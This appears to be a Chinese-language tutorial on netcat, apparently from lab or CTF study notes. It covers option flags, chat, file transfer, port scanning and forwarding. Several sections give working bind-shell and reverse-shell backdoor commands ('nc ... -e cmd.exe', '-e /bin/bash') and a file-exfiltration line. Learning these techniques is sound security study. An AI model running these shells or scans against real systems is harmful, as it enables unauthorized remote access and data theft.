# nc指令

* -h &ensp;&ensp;&nbsp;&nbsp;查看命令帮助
* -l &ensp;&ensp;&nbsp;&nbsp;&nbsp;开启监听模式,当客户端断开连接就会断开程序
* -L &nbsp;&ensp;&nbsp;&nbsp;&nbsp;开启监听模式，当客户端断开连接不会断开程序
* -p &ensp;&ensp;&ensp;监听的端口
* -e &ensp;&ensp;&ensp;执行某个程序
* -w &ensp;&ensp;&nbsp;等待的时间，如果连接超过指定的时间未连接上就退出，例如：w3。是等待3秒
* -v &ensp;&ensp;&ensp;表示对错误的信息进行详细的输出
* -n &ensp;&ensp;&ensp;不对目标机器进行DNS解析
* -z &ensp;&ensp;&ensp;I/O模式，专用于端口扫描，表示对目标IP发送的数据表中不包含任何payload，这样做可以加快扫描的速度
* -d &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;后台运行
* -G &nbsp;&nbsp;&nbsp;&nbsp;设置网关，可用于突破内网限制
* -g &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;路由跳数
* -i &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置发送每一行数据的时间间隔,以秒计算
* -o &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置十六进制的数据
* -r &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置netcat随机化端口号
* -s  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置netcat的源地址
* -t &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;回复telnet的请求数据包
* -u &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置netcat使用udp模式


# nc实现聊天功能
服务端
>nc64 -l -p 4444
<img src="../../image/20201124172035.png">

客户端
>nc 127.0.0.1 4444
<img src="../../image/QQ图片20201124172913.png">

发送消息
><img src="../../image/20201124172036.png">

接受消息
><img src="../../image/QQ图片20201124173401.png">

# nc实现返回cmd
服务端
>nc64 -l -p 4444
<img src="../../image/QQ图片20201125224650.png">

客户端
>nc 127.0.0.1 4444
<img src="../../image/QQ图片20201125224858.png">

# nc实现文件传输
服务端
>nc -l -p 4444 > outfile.txt
<img src="../../image/QQ图片20201126013607.png">

客户端
>nc 192.168.43.170 4444 < /mnt/d/flag.txt
<img src="../../image/QQ图片20201126013858.png">
<img src="../../image/QQ图片20201126013803.png">

结果
<img src="../../image/QQ图片20201126014023.png">
>这是客户端向服务端的文件传输，服务端向客户端的传输操作一样

# nc实现探测
可以通过nc实现内网的ip和端口扫描
条件是目标靶机防火墙必须关闭的状态

攻击机
>nc -z -v -n -w1 192.168.1.101 1-1000
<img src="../../image/QQ图片20201126153306.png">

# nc实现建立后门
windows监听型后门

服务端:
>nc -l -p 4444 -e cmd.exe
当有人连接到服务端的时候就会反弹cmd的后门
<img src="../../image/QQ图片20201126153636.png">

客户端:
>nc 10.5.100.184 4444
<img src="../../image/QQ图片20201126160709.png">

windows连接型后门

服务端：
>nc -l -p 4444
<img src="../../image/QQ图片20201126161050.png" >

客户端:
>nc 10.5.100.42 -e cmd.exe
<img src="../../image/QQ图片20201126161208.png">

linux监听型后门

服务端：
>nc -l -p 4444 -e /bin/bash
<img src="../../image/QQ图片20201126161349.png">

客户端：
>nc 10.5.100.42 4444
<img src="../../image/QQ图片20201126161618.png">

linux连接型后门

服务端
>nc -l -p 4444
<img src="../../image/QQ图片20201126161744.png">


客户端
>nc 10.5.100.42 4444 -e /bin/bash
<img src="../../image/QQ图片20201126162622.png">


# nc实现连接转发
服务端是客户端1的内网，客户端2无法连接服务端，可以通过客户端1的连接转发实现交互
服务端0：
>nc -lp 4444
<img src="../../image/QQ图片20201126171438.png">
>>服务端0-1:
<img src="../../image/QQ图片20201126172204.png">


客户端1：
>nc -lp 4445 -e bat.bat
<img src="../../image/QQ图片20201126171842.png">
<img src="../../image/QQ图片20201126171921.png">

客户端2：
>nc 10.5.100.184 4445
<img src="../../image/QQ图片20201126172056.png">

